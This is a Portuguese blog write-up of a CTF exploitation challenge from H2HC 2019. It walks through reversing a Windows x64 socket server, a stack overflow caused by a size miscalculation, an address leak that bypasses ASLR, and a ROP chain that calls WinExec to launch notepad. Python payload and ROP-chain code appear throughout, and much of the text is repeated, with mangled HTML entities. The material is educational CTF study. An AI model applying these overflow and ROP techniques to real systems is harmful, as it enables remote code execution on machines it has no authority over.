FUN_1400011c0(s__[+]_Message_received:_%i_bytes_14000d000,(ulonglong)uVar1,uVar2,uVar4); puVar3 = local_118; sprintf(&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,s_[+]_H2HC19_message:_%s_14000d028); FUN_1400011c0(&amp;amp;amp;amp;amp;amp;amp;DAT_14000d040,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,puVar3,uVar4); FUN_1400012b0(local_res8,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,local_res10 + local_18,0); } else { FUN_1400011c0(s__[-]_Error:_Invalid_size_14000d048,param_2,param_3,param_4); } FUN_140001050((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8); return; } [/sourcecode] Essa é a função que realiza o tratamento do body enviado, nela podemos ver que uma das primeiras verificações é se o tamanho (que foi passado no header é menor que 0x101). Caso seja menor chama a função FUN_140001260 que na verdade é um alias para a função de socket que recebe os dados, posteriormente mostra a mensagem &quot;[+] Message received...&quot; em tela com o uso da função FUN_1400011c0, utiliza o sprintf para imprimir o texto recebido em tela, em seguida executa as funções FUN_1400011c0 e FUN_1400012b0. Em qualquer condição sempre executa a função FUN_140001050. De forma simples a função FUN_1400012b0 realiza o envio dos dados para o cliente via socket. Vamos dar uma pausa na análise do código para fazer uns testes e verificar se o que vimos realmente é o que acontece. Duas funções creio que seja melhor olharmos elas no debugger para ilustrar melhor o seu funcionamento. Função FUN_140001260 que realiza o recebimento dos dados via rede. Função FUN_1400012b0 que realiza o envio dos dados via rede 0x0301 - PoCs Vamos então tentar enviar a String H2HC seguido de um tamanho menor que o 0x0101 e um buffer. No exemplo abaixo fiz uma PoC passando como tamanho 5 bytes, mas enviando um buffer maior. Como visto a aplicação tratou os 5 bytes e retornou somente os primeiro 5 bytes da mensagem. Vamos agora tentar passar um tamanho maior que os 0x101. Podemos ver que não houve retorno por parte da aplicação e que na console da mesma foi apresentado um erro de tamanho inválido. Fazendo mais um teste vamos passar o valor máximo possível 0x100. Nessa condição podemos ver que ocorreu uma falha na aplicação. Mas não podemos nos empolgar, essa falha ainda não nos dá condição de execução de um código arbitrário. 0x0302 - Análise dinâmica até este ponto. Analisando um pouco mais a fundo podemos ver que na função FUN_140001050 temos a opção de manipular o endereço de retorno. Em um fluxo normal, onde passamos um tamanho de no máximo 0xff, temos o comportamento normal da aplicação Primeiramente é atribuído a EAX o valor que está no endereço de memória final e5b4 que corresponde ao hexa 0x04 Posteriormente atribui a RCX o valor da posição de memória final e5b8 cujo o seu valor é 0x00 E se utiliza desses 2 valores para cacular o endereço que posteriormente será usado como endereço de retorno da função FUN_140001380 que chamou essa função (FUN_140001050). E como podemos ver no topo da pilha no momento do ret da função FUN_140001380 está o endereço que foi calculado anteriormente, desta forma a aplicação chamará como proxima instrução este endereço. Quando passamos o valor 0x100 como tamanho podemos ver que o os valores em ...e5b4 e ...e5b8 são adulterados e consequentemente o endereço de retorno é alterado. O problema é que como esse (0x100) é o valor que podemos passar, não temos como fazer de forma direta uma substituição desses valores para que possamos efetivamente manipular o ret de forma que possamos passar valores de endereço válido. Após uma análise mais profunda e diversos testes encontrei que a vulnerabilidade pela qual é possível realizar o controle ro RET, é aliada com a que mostramos anteriormente, mas ela ocorre somente após o segundo envio de dados. Em uma tentativa de ilustrar melhor o que ocorre (antes de vermos o código da aplicação), a aplicação recebe os dados na pilha atual (no tamanho especificado pelo usuário até 0x100), mas para realizar isso realiza a soma 2 valores para definir esse tamanho que será recebido, a falha ocorre exatamente neste ponto. Um dos valores da soma é o que o usuário passou 0x00 até 0x0100) e o outro é ums posição de memória, o problema que essa posição de memória está 252 bytes (Hexa: 0xFC) a frente da posição de memória onde é salvo os dados recebidos do socket, como nós podemos gravar até 256 bytes (Hexa: 0x0100), podemos substituir esse valor do cálculo. Segue abaixo os prints das evidencias do teste Comandos sequenciais para evidenciar a falha Note o endereço para o qual serão enviados os dados (0xc7f5e0) bem como os dados que estão na pilha. Agora logo após a execução da função de recebimento dos dados. Agora executamos o segundo comando Observe agora os valores de RAX e RCX, onde RAX recebe o valor que está na posição 252 do nosso buffer, e o RCX recebe o valor 05, que foi o tamanho passado por mim, e a soma dos 2 vai ocorrer podendo assim extrapolar os 256 bytes de limite da aplicação. &nbsp; 0x0303 - Memory Address Leak. Para que possamos redirecionar o fluxo da aplicação para um endereço de POP POP RET ou outro qualquer que desejamos, se faz necessário conhecer o endereçamento atual da execução e como a aplicação e o Sistema Operacional estão com as proteções de memória Habilitadas (neste caso ASLR). Para que a aplicação nos envie os dados, ela faz um cálculo um pouco diferente, usando outras posições de memória, mas igualmente podendo serem manipuladas por nós. Segue abaixo as 2 linhas responsáveis por explorar a vulnerabilidade do leak. Observe que os registradores RAX e RCX receberam os dados desejados. Que posteriormente serão utilizados como terceiro parâmetro da função Send do Socket que por sua vez é o parâmetro que define o tamanho do buffer que será enviado Neste ponto vamos escrever nosso primeiro PoC do exploit. Neste exploit ainda não temos uma versão funcional do Leak, pois precisaremos realizar alguns ajustes para que o mesmo funcione corretamente (próximo assunto que abordaremos). Adicionalmente iremos utilizar a biblioteca pwnlib para nos facilitar no processo de exploit. 0x0303 - Retomada do fluxo. Para que a nossa aplicação nos retorno os dados se faz necessário ajustar nosso payload para que o endereço no topo da pilha (conforme vimos em 0x0302 - Análise dinâmica até este ponto). Abaixo temos o novo script, nele podemos observar que removi os últimos bytes do segundo payload para que tenhamos um endereço de retorno viável, pois com eles estavam sendo substituídos os endereços que a aplicação usa para controle. Ajustamos os ultimos 4 bytes para ser 0x040090000 de forma que o byte 0x04 é usado (dentro da função FUN_140001050) para ser o RAX que será posteriormente multiplicado a 8 e somado a um endereço para calcular o endereço que ficará como sendo o endereço no topo da pilha para ser usado no RET, sendo assim o endereço das próximas instruções da nossa aplicação. Segue abaixo a imagem do endereço calculado no topo da pilha. Mas temos que lembrar que este conjunto de 4 bytes são os usados como tamanho de retorno dos dados por parte da função send do socket (como cimos anteriormente). Sendo assim para que tenhamos o leak de diversos endereços que precisamos colocar no mínimo 2308 bytes (Hexa: 0x0904). Como resultado da execução podemos ver que tivemos um retorno de 0xa03 bytes, sendo que diversos deles são leaks de endereços da aplicação. Utilizando o trecho de código abaixo podemos capturar e tratar os dados recebidos a fim de extrair os endereços desejados. [sourcecode language=&quot;python&quot;]p1.recvuntil(&quot;H2HC19 message:&quot;) #Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text) p1.recv(0x10d) ld1 = p1.recv(8) leak_local_addr = u64(ld1.ljust(8, &quot;\x00&quot;)) base_addr = leak_local_addr &amp;amp;amp; 0xffffffffffff0000 log.info(&quot;Local leak : %s&quot; % hex(leak_local_addr)) log.info(&quot;App Base Addr : %s&quot; % hex(base_addr)) # Leak do endereço da função WinExec p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a fa 7f lead_data = p1.recv(8) p1.recv(4096) leak = u64(lead_data.ljust(8, &quot;\x00&quot;)) log.info(&quot;WinExec addr leak : %s&quot; % hex(leak)) [/sourcecode] Tendo como resultado abaixo Segue o código completo 0x04 - ROP - Controlando o fluxo da aplicação Uma vez que temos o endereço base da aplicação podemos utilizar nossos Gadgets para controlar o fluxo da aplicação Sendo assim temos como payload do terceiro estágio o trecho abaixo [sourcecode language=&quot;python&quot;]payload3 = &quot;H2HC&quot; #cookie payload3 += &quot;\x00\x01\x00\x00&quot; #size to trigger the vul payload3 += &quot;A&quot; * 0x100 payload3 += &quot;\x01\x01\x01\x01&quot; # Não pode ter nullbyte aqui payload3 += &quot;A&quot; * (8) # padding payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento payload3 += &quot;\x41&quot; * (4) # Alinhamento payload3 += &quot;\x42&quot; * (8) # Trash [/sourcecode] Ficando nosso exploit completo como abaixo 0x05 - WinExec x64 calling conventions Essa fase creio que foi uma das mais desafiadoras, pois tive que voltar aos livros (neste caso a web) e ler de forma detalhada a Convenção de chamada (Calling Conventions) disponível em https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019 Isso ocorre pois em 64bits há uma série de requisitos definidos na convenção de chamada que precisam ser cumpridos para que a aplicação (Chamada da função WinExec) funcione corretamente. Segue abaixo os requisitos: O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no momento do call da WinExec, pois dentro da chamada da winexec ele utiliza alguns bytes anteriores a posição atual da stack, causando a substituição do nosso comando O Endereço do comando tem de estar alinhado a 16 bytes para saber se o endereço está alinhado basta realizar o calculo (endereço &amp; 0xfffffffffffffff0) O Endereço da pilha no momento da chamada do call da WinExec tem de estar alinhado a 16 bytes Na Pilha tem de ter o equivalente a 3 parâmetros como Shadow data (3 * 8 bytes) Na quarta posição da pilha tem de haver um endereço válido da aplicação (não é efetivamente usado mas dentro da WinExec ele cacula alguma coisa com este endereço e se for inválido da exception) Conforme a definição da Microsoft a função WinExec (https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) necessita de 2 parâmetros [sourcecode language=&quot;c&quot;]UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); [/sourcecode] Onde: lpCmdLine é o comando a ser executado; uCmdShow como deve ser a visualização da aplicação filha. Este parâmetro acita diversos valores, mas os principais são: 0 - Hide, 3 - Maximize; 6 - Minimize; e 5 Show); Segundo a convenção de chamadas para 64bits devemos ter então as seguintes informações: RCX: Primeiro parâmetro da função (lpCmdLine); RDX: Segundo parâmetro da função (uCmdShow); Pilha: Shadow space; A nossa função (WinExec) exige os seguintes requisitos adicionais: Shadow space precisa ser de 24 bytes (3 * 8); Após os 24 bytes um endereço válido da aplicação. (Não entendi bem o porque, mas meu chute é que a função tenha alguma mitigação que verifique se o endereço de retorno é um endereço válido) 0x06 - ROP exploit final Utilizando os gadgets que pegamos no início deste tutorial, podemos calcular os dados de forma estratégica para montar os dados conforme os requisitos acima, ficando conforme e imagem abaixo Onde: R12 contém o endereço da função WinExec; RCX contém o parâmetro lpCmdLine, ou seja, endereço do comando a ser executado; RDX contém o parâmetro uCmdShow, ou seja, zero; Pilha (stack) contém 24 bytes de shadow space seguido de um endereço válido da aplicação; Ficando então este trecho de ROP conforme abaixo [sourcecode language=&quot;python&quot;]base_offset = 928 # esse offset calcula de forma que o apontamento chegue a primeira instrução do ROP Chain abaixo rop_chain2 = p64(leak) # WinExec --&amp;gt; Endereço que será chamado pelo call r12 rop_chain2 += p64(base_addr + 0x05c14) # add eax, r15d ; ret rop_chain2 += p64(base_addr + 0x0166a) # add esp, 0x28 ; ret --&amp;gt; Ajusta o alinhamento a 16 bytes rop_chain2 += &quot;\x41&quot; * 0x28 rop_chain2 += p64(base_addr + 0x0464f) # nop ; ret rop_chain2 += p64(base_addr + 0x06e1d) # mov rcx, rax ; call r12 rop_chain2 += &quot;\x00&quot; * (8*3) # Shadow Data rop_chain2 += p64(base_addr + 0x0464f) # NOP RET --&amp;gt; Será usado pela função WinExec rop_chain2 += &quot;\x00&quot; * (8*10) # Padding rop_chain2 += &quot;\x00&quot; * ((len(rop_chain2) + (8 * 4)) % 16) # Calcula simetria de 16 bytes rop_chain1 = p64(base_addr + 0x07cc8) # mov rax, r11 ; ret rop_chain1 += p64(base_addr + 0x04b59) # pop r15 ; pop r13 ; pop r12 ; ret rop_chain1 += p64(base_offset + len(rop_chain2) + (8 * 4)) # Numero a ser adicionado em rax rop_chain1 += &quot;\x41&quot; * 8 cmd = &quot;notepad.exe&quot; payload3 += rop_chain1 + rop_chain2 + cmd + &quot;\x00&quot; [/sourcecode] E tendo nosso código final funcional abaixo 0x06 - Agradecimentos Gostaria de agradecer aos amigos que jogaram comigo no CTF do H2HC, mesmo que não tenhamos conseguido resolver esse desafio de exploitation a tempo de pontuar no CTF, mas o desafio valeu a pena. Também gostaria de agradecer o Feroso pela troca de idéias e dicas durante o estudo deste exploit." /><link rel="canonical" href="https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/" /><meta property="og:url" content="https://www.helviojunior.com.br/it/ctf-exploit-h2hc-2019/" /><meta property="og:site_name" content="Helvio Junior" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-11-05T23:56:57-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="[CTF - Writeup] Exploit H2HC 2019" /><meta name="twitter:site" content="@helvioju" /><meta name="twitter:creator" content="@Helvio Junior (m4v3r1ck)" /><meta name="google-site-verification" content="JR4IIP9jfvOwxn2ybV_Qn0SrtDPlTrKomdPWgBuP55k"" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Helvio Junior (m4v3r1ck)"},"dateModified":"2023-08-17T00:19:29-03:00","datePublished":"2019-11-05T23:56:57-03:00","description":"0x00 - Introdução Este ano (2019) tive o privilégio de participar da H2HC e durante a conferência teve um desafio CTF do qual eu participei com alguns amigos. O jogo começo com um desafio de engenharia reversa e outro de exploitation. Neste post iremos reproduzir passo a passo o processo de exploração deste exploit. 0x01 - Escopo Para este desafio nos foi entregue um binário, o mesmo disponível no link (h2hc_2019_ctf), com uma descrição &quot;Para o desafio de exploração o exploit deve funcionar no Windows 10 com full ASLR e outras mitigações habilitadas&quot;, sendo assim temos de montar um ambiente com Windows 10 atualizado e com as proteções de memória (ASLR e DEP) habilitadas. 0x02 - Enumeração Como qualquer exploração, uma das principais fases é a enumeração, então vamos lá. 0x0201 - Hashes [sourcecode language=&quot;shell&quot;]# md5sum h2hc.exe ca3c795f41b65cc298a87027869a111d h2hc.exe # sha1sum h2hc.exe 20976f919b8ca7430e73e51fbd826dc570fa03d2 h2hc.exe [/sourcecode] Utilizando o readpe do Kali podemos ver diversas informações da aplicação, abaixo segue o output de algumas partes, que extrairemos informações importantes. [sourcecode language=&quot;shell&quot;]# readpe --all h2hc.exe DOS Header Magic number: 0x5a4d (MZ) Bytes in last page: 144 Pages in file: 3 Relocations: 0 Size of header in paragraphs: 4 Minimum extra paragraphs: 0 Maximum extra paragraphs: 65535 Initial (relative) SS value: 0 Initial SP value: 0xb8 Initial IP value: 0 Initial (relative) CS value: 0 Address of relocation table: 0x40 Overlay number: 0 OEM identifier: 0 OEM information: 0 PE header offset: 0xe0 COFF/File header Machine: 0x8664 IMAGE_FILE_MACHINE_AMD64 Number of sections: 5 Date/time stamp: 1568413383 (Fri, 13 Sep 2019 22:23:03 UTC) Symbol Table offset: 0 Number of symbols: 0 Size of optional header: 0xf0 Characteristics: 0x22 Characteristics names IMAGE_FILE_EXECUTABLE_IMAGE IMAGE_FILE_LARGE_ADDRESS_AWARE Optional/Image header Magic number: 0x20b (PE32+) Linker major version: 10 Linker minor version: 0 Size of .text section: 0x8200 Size of .data section: 0x7c00 Size of .bss section: 0 Entrypoint: 0x1aa8 Address of .text section: 0x1000 ImageBase: 0x140000000 Alignment of sections: 0x1000 Alignment factor: 0x200 Major version of required OS: 5 Minor version of required OS: 2 Major version of image: 0 Minor version of image: 0 Major version of subsystem: 5 Minor version of subsystem: 2 Size of image: 0x14000 Size of headers: 0x400 Checksum: 0 Subsystem required: 0x3 (IMAGE_SUBSYSTEM_WINDOWS_CUI) DLL characteristics: 0x8140 DLL characteristics names IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE IMAGE_DLLCHARACTERISTICS_NX_COMPAT IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE Size of stack to reserve: 0x100000 Size of stack to commit: 0x1000 Size of heap space to reserve: 0x100000 Size of heap space to commit: 0x1000 ... Imported functions Library Name: KERNEL32.dll Functions Function Name: WinExec Function Name: GetCommandLineA ... Sections Section Name: .text Virtual Address: 0x1000 Physical Address: 0x8027 Size: 0x8200 (33280 bytes) Pointer To Data: 0x400 Relocations: 0 Characteristics: 0x60000020 Characteristic Names IMAGE_SCN_CNT_CODE IMAGE_SCN_MEM_EXECUTE IMAGE_SCN_MEM_READ [/sourcecode] Neste output algumas informações são importantes: ImageBase: 0x140000000 Address of .text section: 0x1000 Imported functions contains: WinExec 0x0202 - ROP Gadgets Como este exploit será com proteções de memória ASLR + DEP, inevitavelmente iremos utilizar a técnica de ROP, então ainda no Kali já vamos pegar os gadgets Utilizando a ferramenta ROP disponível em https://github.com/JonathanSalwan/ROPgadget podemos obter todos os endereços que utilizemos futuramente [sourcecode language=&quot;shell&quot;]# ROPgadget --binary h2hc.exe Gadgets information ============================================================ 0x000000014000567b : adc ah, bl ; add byte ptr [rax], al ; inc edx ; jmp 0x140005669 0x000000014000323b : adc al, 0 ; add byte ptr [rbp - 0x74f78b40], al ; retf 0x0000000140002276 : adc al, 0x48 ; add esp, 0x28 ; ret ... ... ... 0x00000001400036d7 : xor esi, dword ptr [rcx + rdx - 1] ; ret 0xff49 0x0000000140008c0f : xor rax, rax ; ret Unique gadgets found: 1048 [/sourcecode] Este comando nos retornou 1048 gadgets. 0x0203 - Interagindo com a aplicação Vamos então começar a brincadeira e interagir com a aplicação. Abrinda a aplicação no Windows podemos ver que a mesma realiza um bind na porta 54345 &nbsp; Podemos ver que há mensagens mostradas na console da aplicação 0x03 - Entendendo a aplicação Como vimos anteriormente a aplicação espera uma espécie de cabeçalho (header) para realizar a comunicação, sendo assim será necessário realizar a engenharia reversa da mesma, para esta tarefa utilizaremos a ferramenta Ghidra disponível em https://ghidra-sre.org/. Neste passo irei gastar um pouco mais de tempo para entendermos o fluxo da aplicação, fluxo este que determinará no sucesso do nosso overflow. Analisando o comportamento da aplicação podemos ver que ela imprime em tela algumas mensagens como &quot;Server listenning&quot;, Waiting for H2HC evil connections&quot;, sendo assim vamos começar procurando pela função que imprime essas mensagens. Na posição 140001520 encontramos essa função na qual detém o pseudocode conforma abaixo [sourcecode language=&quot;c&quot;] /* WARNING: Removing unreachable block (ram,0x000140001608) */ void FUN_140001520(undefined4 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4) { ulonglong uVar1; undefined *puVar2; longlong *plVar3; undefined4 local_res8 [8]; longlong local_48; undefined4 local_40 [2]; undefined local_38 [32]; longlong local_18; local_res8[0] = param_1; FUN_140001000((longlong)local_res8); uVar1 = FUN_1400010a0(); if ((int)uVar1 == 0) { FUN_1400011c0(s_[-]_Socket_support_version_error_14000d0c8,param_2,param_3,param_4); } else { plVar3 = &amp;amp;amp;amp;amp;amp;amp;local_48; puVar2 = (undefined *)0xd449; uVar1 = FUN_140001110(s_0.0.0.0_14000d0f0,0xd449,plVar3); if ((int)uVar1 != 0) { FUN_1400011c0(s_[+]_Server_listening_14000d128,puVar2,plVar3,param_4); do { while( true ) { FUN_1400011c0(s_[+]_Waiting_for_H2HC_evil_connec_14000d140,puVar2,plVar3,param_4); local_40[0] = 0x10; plVar3 = (longlong *)local_40; puVar2 = local_38; local_18 = FUN_140001210(local_48,puVar2,plVar3); if (local_18 != -1) break; FUN_1400011c0(s__[-]_Client_socket_error_14000d168,puVar2,plVar3,param_4); } FUN_1400011c0(s__[+]_New_connection_accepted_14000d188,puVar2,plVar3,param_4); FUN_140001480(local_18); FUN_1400011c0(s__[+]_Closing_connection_14000d1a8,puVar2,plVar3,param_4); FUN_140001300(local_18); } while( true ); } FUN_1400011c0(s_[-]_It_was_not_possible_to_bind:_14000d100,s_0.0.0.0_14000d0f8,0xd449,param_4); } FUN_140001050((longlong)local_res8); return; } [/sourcecode] Quando uma conexão é recebida a mesma é tratada pela função localizada na posição 140001480, aqui nomeada FUN_140001480. Que temos o seu pseudocode abaixo [sourcecode language=&quot;c&quot;]void FUN_140001480(undefined8 param_1) { uint uVar1; ulonglong uVar2; undefined8 uVar3; undefined8 uVar4; undefined8 local_res8 [4]; int local_10; uint local_c; local_res8[0] = param_1; FUN_140001000((longlong)local_res8); uVar4 = 0; uVar3 = 8; uVar1 = FUN_140001260(local_res8[0],&amp;amp;amp;amp;amp;amp;amp;local_10,8,0); uVar2 = (ulonglong)uVar1; FUN_1400011c0(s__[+]_Header_received:_%i_bytes_14000d068,uVar2,uVar3,uVar4); if (uVar1 == 8) { if (local_10 == 0x43483248) { FUN_140001380(local_res8[0],(ulonglong)local_c,uVar3,uVar4); } else { FUN_1400011c0(s__[-]_Error:_Invalid_cookie_14000d0a8,uVar2,uVar3,uVar4); } } else { FUN_1400011c0(s__[-]_Error:_Invalid_header_14000d088,uVar2,uVar3,uVar4); } FUN_140001050((longlong)local_res8); return; } [/sourcecode] &nbsp; Essa função recebe os dados que enviamos, separando um header de um body, tendo o header em local_10 e o body local_res8. A aplicação realiza as seguintes ações de checagem: Verifica se o header tem 8 bytes; Verifica se o header é igual a 0x43483248 que decodando o hexa chegamos ao texto H2HC; Caso ocorra as duas condições a função FUN_140001380 é chamada. Sendo assim nosso header deve conter 8 bytes, onde os 4 primeiros é o texto H2HC e os 4 bytes subsequentes é o tamanho do body enviado, conforme veremos abaixo. Segue abaixo o pseudocódigo da função FUN_140001380 [sourcecode language=&quot;c&quot;]void FUN_140001380(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4) { uint uVar1; ulonglong uVar2; undefined *puVar3; undefined8 uVar4; undefined8 local_res8; uint local_res10; undefined local_118 [252]; int local_1c; int local_18; local_res10 = (uint)param_2; local_18 = local_1c; local_res8 = param_1; FUN_140001000((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8); if (local_res10 &amp;amp;amp;amp;amp;amp;lt; 0x101) { uVar4 = 0; uVar2 = (ulonglong)(local_res10 + local_18); uVar1 = FUN_140001260(local_res8,local_118,local_res10 + local_18,0); FUN_1400011c0(s__[+]_Message_received:_%i_bytes_14000d000,(ulonglong)uVar1,uVar2,uVar4); puVar3 = local_118; sprintf(&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,s_[+]_H2HC19_message:_%s_14000d028); FUN_1400011c0(&amp;amp;amp;amp;amp;amp;amp;DAT_14000d040,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,puVar3,uVar4); FUN_1400012b0(local_res8,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,local_res10 + local_18,0); } else { FUN_1400011c0(s__[-]_Error:_Invalid_size_14000d048,param_2,param_3,param_4); } FUN_140001050((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8); return; } [/sourcecode] Essa é a função que realiza o tratamento do body enviado, nela podemos ver que uma das primeiras verificações é se o tamanho (que foi passado no header é menor que 0x101). Caso seja menor chama a função FUN_140001260 que na verdade é um alias para a função de socket que recebe os dados, posteriormente mostra a mensagem &quot;[+] Message received...&quot; em tela com o uso da função FUN_1400011c0, utiliza o sprintf para imprimir o texto recebido em tela, em seguida executa as funções FUN_1400011c0 e FUN_1400012b0. Em qualquer condição sempre executa a função FUN_140001050. De forma simples a função FUN_1400012b0 realiza o envio dos dados para o cliente via socket. Vamos dar uma pausa na análise do código para fazer uns testes e verificar se o que vimos realmente é o que acontece. Duas funções creio que seja melhor olharmos elas no debugger para ilustrar melhor o seu funcionamento. Função FUN_140001260 que realiza o recebimento dos dados via rede. Função FUN_1400012b0 que realiza o envio dos dados via rede 0x0301 - PoCs Vamos então tentar enviar a String H2HC seguido de um tamanho menor que o 0x0101 e um buffer. No exemplo abaixo fiz uma PoC passando como tamanho 5 bytes, mas enviando um buffer maior. Como visto a aplicação tratou os 5 bytes e retornou somente os primeiro 5 bytes da mensagem. Vamos agora tentar passar um tamanho maior que os 0x101. Podemos ver que não houve retorno por parte da aplicação e que na console da mesma foi apresentado um erro de tamanho inválido. Fazendo mais um teste vamos passar o valor máximo possível 0x100. Nessa condição podemos ver que ocorreu uma falha na aplicação. Mas não podemos nos empolgar, essa falha ainda não nos dá condição de execução de um código arbitrário. 0x0302 - Análise dinâmica até este ponto. Analisando um pouco mais a fundo podemos ver que na função FUN_140001050 temos a opção de manipular o endereço de retorno. Em um fluxo normal, onde passamos um tamanho de no máximo 0xff, temos o comportamento normal da aplicação Primeiramente é atribuído a EAX o valor que está no endereço de memória final e5b4 que corresponde ao hexa 0x04 Posteriormente atribui a RCX o valor da posição de memória final e5b8 cujo o seu valor é 0x00 E se utiliza desses 2 valores para cacular o endereço que posteriormente será usado como endereço de retorno da função FUN_140001380 que chamou essa função (FUN_140001050). E como podemos ver no topo da pilha no momento do ret da função FUN_140001380 está o endereço que foi calculado anteriormente, desta forma a aplicação chamará como proxima instrução este endereço. Quando passamos o valor 0x100 como tamanho podemos ver que o os valores em ...e5b4 e ...e5b8 são adulterados e consequentemente o endereço de retorno é alterado. O problema é que como esse (0x100) é o valor que podemos passar, não temos como fazer de forma direta uma substituição desses valores para que possamos efetivamente manipular o ret de forma que possamos passar valores de endereço válido. Após uma análise mais profunda e diversos testes encontrei que a vulnerabilidade pela qual é possível realizar o controle ro RET, é aliada com a que mostramos anteriormente, mas ela ocorre somente após o segundo envio de dados. Em uma tentativa de ilustrar melhor o que ocorre (antes de vermos o código da aplicação), a aplicação recebe os dados na pilha atual (no tamanho especificado pelo usuário até 0x100), mas para realizar isso realiza a soma 2 valores para definir esse tamanho que será recebido, a falha ocorre exatamente neste ponto. Um dos valores da soma é o que o usuário passou 0x00 até 0x0100) e o outro é ums posição de memória, o problema que essa posição de memória está 252 bytes (Hexa: 0xFC) a frente da posição de memória onde é salvo os dados recebidos do socket, como nós podemos gravar até 256 bytes (Hexa: 0x0100), podemos substituir esse valor do cálculo. Segue abaixo os prints das evidencias do teste Comandos sequenciais para evidenciar a falha Note o endereço para o qual serão enviados os dados (0xc7f5e0) bem como os dados que estão na pilha. Agora logo após a execução da função de recebimento dos dados. Agora executamos o segundo comando Observe agora os valores de RAX e RCX, onde RAX recebe o valor que está na posição 252 do nosso buffer, e o RCX recebe o valor 05, que foi o tamanho passado por mim, e a soma dos 2 vai ocorrer podendo assim extrapolar os 256 bytes de limite da aplicação. &nbsp; 0x0303 - Memory Address Leak. Para que possamos redirecionar o fluxo da aplicação para um endereço de POP POP RET ou outro qualquer que desejamos, se faz necessário conhecer o endereçamento atual da execução e como a aplicação e o Sistema Operacional estão com as proteções de memória Habilitadas (neste caso ASLR). Para que a aplicação nos envie os dados, ela faz um cálculo um pouco diferente, usando outras posições de memória, mas igualmente podendo serem manipuladas por nós. Segue abaixo as 2 linhas responsáveis por explorar a vulnerabilidade do leak. Observe que os registradores RAX e RCX receberam os dados desejados. Que posteriormente serão utilizados como terceiro parâmetro da função Send do Socket que por sua vez é o parâmetro que define o tamanho do buffer que será enviado Neste ponto vamos escrever nosso primeiro PoC do exploit. Neste exploit ainda não temos uma versão funcional do Leak, pois precisaremos realizar alguns ajustes para que o mesmo funcione corretamente (próximo assunto que abordaremos). Adicionalmente iremos utilizar a biblioteca pwnlib para nos facilitar no processo de exploit. 0x0303 - Retomada do fluxo. Para que a nossa aplicação nos retorno os dados se faz necessário ajustar nosso payload para que o endereço no topo da pilha (conforme vimos em 0x0302 - Análise dinâmica até este ponto). Abaixo temos o novo script, nele podemos observar que removi os últimos bytes do segundo payload para que tenhamos um endereço de retorno viável, pois com eles estavam sendo substituídos os endereços que a aplicação usa para controle. Ajustamos os ultimos 4 bytes para ser 0x040090000 de forma que o byte 0x04 é usado (dentro da função FUN_140001050) para ser o RAX que será posteriormente multiplicado a 8 e somado a um endereço para calcular o endereço que ficará como sendo o endereço no topo da pilha para ser usado no RET, sendo assim o endereço das próximas instruções da nossa aplicação. Segue abaixo a imagem do endereço calculado no topo da pilha. Mas temos que lembrar que este conjunto de 4 bytes são os usados como tamanho de retorno dos dados por parte da função send do socket (como cimos anteriormente). Sendo assim para que tenhamos o leak de diversos endereços que precisamos colocar no mínimo 2308 bytes (Hexa: 0x0904). Como resultado da execução podemos ver que tivemos um retorno de 0xa03 bytes, sendo que diversos deles são leaks de endereços da aplicação. Utilizando o trecho de código abaixo podemos capturar e tratar os dados recebidos a fim de extrair os endereços desejados. [sourcecode language=&quot;python&quot;]p1.recvuntil(&quot;H2HC19 message:&quot;) #Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text) p1.recv(0x10d) ld1 = p1.recv(8) leak_local_addr = u64(ld1.ljust(8, &quot;\\x00&quot;)) base_addr = leak_local_addr &amp;amp;amp; 0xffffffffffff0000 log.info(&quot;Local leak : %s&quot; % hex(leak_local_addr)) log.info(&quot;App Base Addr : %s&quot; % hex(base_addr)) # Leak do endereço da função WinExec p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a fa 7f lead_data = p1.recv(8) p1.recv(4096) leak = u64(lead_data.ljust(8, &quot;\\x00&quot;)) log.info(&quot;WinExec addr leak : %s&quot; % hex(leak)) [/sourcecode] Tendo como resultado abaixo Segue o código completo 0x04 - ROP - Controlando o fluxo da aplicação Uma vez que temos o endereço base da aplicação podemos utilizar nossos Gadgets para controlar o fluxo da aplicação Sendo assim temos como payload do terceiro estágio o trecho abaixo [sourcecode language=&quot;python&quot;]payload3 = &quot;H2HC&quot; #cookie payload3 += &quot;\\x00\\x01\\x00\\x00&quot; #size to trigger the vul payload3 += &quot;A&quot; * 0x100 payload3 += &quot;\\x01\\x01\\x01\\x01&quot; # Não pode ter nullbyte aqui payload3 += &quot;A&quot; * (8) # padding payload3 += p64(base_addr + 0x0464f) # NOP RET para saltar para depois do alinhamento payload3 += &quot;\\x41&quot; * (4) # Alinhamento payload3 += &quot;\\x42&quot; * (8) # Trash [/sourcecode] Ficando nosso exploit completo como abaixo 0x05 - WinExec x64 calling conventions Essa fase creio que foi uma das mais desafiadoras, pois tive que voltar aos livros (neste caso a web) e ler de forma detalhada a Convenção de chamada (Calling Conventions) disponível em https://docs.microsoft.com/pt-br/cpp/build/x64-calling-convention?view=vs-2019 Isso ocorre pois em 64bits há uma série de requisitos definidos na convenção de chamada que precisam ser cumpridos para que a aplicação (Chamada da função WinExec) funcione corretamente. Segue abaixo os requisitos: O Comando tem de estar a frente da posição da pilha (ou 128 bytes antes) no 